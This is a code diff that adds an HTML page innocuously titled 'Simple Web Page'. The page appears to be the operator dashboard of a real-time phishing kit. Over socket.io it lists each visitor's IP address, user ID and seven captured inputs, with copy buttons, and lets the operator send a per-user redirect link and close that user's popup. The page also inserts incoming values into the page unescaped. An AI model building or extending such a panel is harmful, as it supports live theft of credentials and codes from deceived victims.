@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script src="https://cdn.socket.io/4.7.2/socket.io.min.js" integrity="sha384-mZLF4UVrpi/QTWPA7BjNPEnkIfRFn4ZEO3Qt/HFklTJBj/gBOV8G3HcKn4NfQblz" crossorigin="anonymous"></script>
+        <title>Simple Web Page</title>
+    </head>
+    <body>
+
+        <style>
+            table {
+                width: 100%;
+                margin: 10px auto;
+            }
+            table, tr, td, th {
+                border: 1px solid #000;
+                border-collapse: collapse;
+                text-align: center;
+            }
+        </style>
+
+        <table id="userTable">
+            <thead>
+              <tr>
+                <th>IP Address</th>
+                <th>User ID</th>
+                <th>Input 1</th>
+                <th>Input 2</th>
+                <th>Input 3</th>
+                <th>Input 4</th>
+                <th>Input 5</th>
+                <th>Input 6</th>
+                <th>Input 7</th>
+                <th>Link</th>
+                <th>Action</th>
+              </tr>
+            </thead>
+            <tbody>
+            </tbody>
+        </table>
+
+
+        <script src="./jquery.js"></script>
+        <script>
+            $(document).ready(function() {
+
+                const socket = io();
+    
+                socket.on('updateTable', (data) => {
+                    $('table tbody').prepend(`
+                        <tr userId="${data.userId}">
+                            <td><span>${data.ipAddress}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.userId}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input1}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input2}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input3}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input4}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input5}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input6}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input7}</span> <button class="table-copy">📋</button></td>
+                            <td>
+                                <span style="display: none">✅</span>
+                                <input type="text" userId="${data.userId}" class="table-input">
+                            </td>
+                            <td><button userId="${data.userId}" class="table-btn">Close Popup</button></td>
+                        </tr>
+                    `)
+                });
+
+                $('table').on('click', '.table-copy', function() {
+                    navigator.clipboard.writeText($(this).parent().find('span').text())
+                })
+
+                $('table').on('input', '.table-input', function() {
+                    socket.emit('redirect', $(this).attr('userId'), $(this).val())
+                    $(this).parents('tr').find('.table-btn').attr('link', $(this).val())
+                    $(this).hide()
+                    $(this).parent().find('span').show()
+                })
+                $('table').on('click', '.table-btn', function() {
+                    socket.emit('finish', $(this).attr('userId'), $(this).attr('link'))
+                })
+
+                socket.on('closePopup', (userId, url) => {
+                    $('table tr').each(function() {
+                        if ($(this).attr('userId') === userId) {
+                            $(this).remove()
+                        } else {
+
+                        }
+                    })
+                })
+
+            })
+
+        </script>
+    </body>
+</html>
